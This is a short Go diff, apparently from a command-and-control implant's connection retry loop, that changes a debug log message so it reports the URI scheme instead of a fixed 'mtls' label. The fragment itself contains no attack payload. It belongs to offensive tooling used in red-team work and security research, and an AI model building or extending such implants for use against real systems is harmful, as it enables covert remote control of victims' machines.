@@ -157,7 +157,7 @@ func StartConnectionLoop() *Connection {
 				return connection
 			}
 			// {{if .Debug}}
-			log.Printf("[mtls] Connection failed %s", err)
+			log.Printf("[%s] Connection failed %s", uri.Scheme, err)
 			// {{end}}
 			connectionAttempts++
 			// {{end}} - HTTPc2Enabled
